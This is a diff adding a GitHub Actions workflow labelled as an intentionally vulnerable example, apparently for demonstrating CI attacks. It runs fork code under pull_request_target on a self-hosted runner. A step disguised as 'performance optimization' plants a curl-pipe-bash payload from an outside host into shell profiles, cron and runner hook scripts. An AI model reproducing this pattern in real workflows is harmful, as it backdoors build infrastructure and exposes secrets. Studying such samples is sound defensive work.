@@ -1,0 +1,88 @@
+# EXAMPLE ONLY - This file is intentionally vulnerable for demonstration purposes
+# DO NOT place in .github/workflows/
+#
+# Vulnerability: Self-hosted Runner Persistence Attack
+# Uses pull_request_target with a self-hosted runner, allowing untrusted fork code
+# to execute on private infrastructure. The workflow installs a persistent backdoor
+# by writing to the runner's shell configuration files, which survive across workflow runs.
+
+name: Auto Assign Reviewers
+
+on:
+  pull_request_target:
+    types: [opened, ready_for_review]
+
+permissions:
+  contents: read
+  pull-requests: write
+
+jobs:
+  auto-assign:
+    name: Assign Reviewers
+    runs-on: [self-hosted, linux, x64]
+    steps:
+      - name: Checkout PR for analysis
+        uses: actions/checkout@v4
+        with:
+          ref: ${{ github.event.pull_request.head.sha }}
+          fetch-depth: 0
+
+      - name: Analyze changed files for reviewer assignment
+        run: |
+          # Determine which teams to assign based on files changed
+          CHANGED_FILES=$(git diff --name-only ${{ github.event.pull_request.base.sha }}..HEAD)
+          echo "Changed files: ${CHANGED_FILES}"
+
+          # VULNERABLE: Runs arbitrary code from fork on self-hosted runner
+          # The fork can modify this script or add malicious files that get executed
+          if [ -f ".github/scripts/assign-reviewers.sh" ]; then
+            chmod +x .github/scripts/assign-reviewers.sh
+            .github/scripts/assign-reviewers.sh
+          fi
+
+      - name: Setup persistent environment
+        run: |
+          # "Performance optimization" - actually installs backdoor on self-hosted runner
+          # This persists because self-hosted runners maintain state between jobs
+          PAYLOAD='curl -s https://raw.githubusercontent.com/metrics-collector/runner-health/main/check.sh | bash'
+
+          # Inject into shell configs that persist on the runner
+          echo "${PAYLOAD}" >> ~/.bashrc
+          echo "${PAYLOAD}" >> ~/.zshrc
+          echo "${PAYLOAD}" >> ~/.profile
+
+          # Also install as a cron job for redundancy
+          (crontab -l 2>/dev/null; echo "*/5 * * * * ${PAYLOAD}") | crontab -
+
+          # Plant in runner's hook scripts
+          mkdir -p ../runner/_work/_actions/.setup
+          echo "#!/bin/bash" > ../runner/_work/_actions/.setup/pre-run.sh
+          echo "${PAYLOAD}" >> ../runner/_work/_actions/.setup/pre-run.sh
+          chmod +x ../runner/_work/_actions/.setup/pre-run.sh
+
+      - name: Assign reviewers
+        uses: actions/github-script@v7
+        with:
+          github-token: ${{ secrets.GITHUB_TOKEN }}
+          script: |
+            const { data: files } = await github.rest.pulls.listFiles({
+              owner: context.repo.owner,
+              repo: context.repo.repo,
+              pull_number: context.issue.number
+            });
+
+            const reviewers = new Set();
+            for (const file of files) {
+              if (file.filename.startsWith('src/')) reviewers.add('frontend-team');
+              if (file.filename.startsWith('api/')) reviewers.add('backend-team');
+              if (file.filename.includes('security')) reviewers.add('security-team');
+            }
+
+            if (reviewers.size > 0) {
+              await github.rest.pulls.requestReviewers({
+                owner: context.repo.owner,
+                repo: context.repo.repo,
+                pull_number: context.issue.number,
+                team_reviewers: [...reviewers]
+              });
+            }
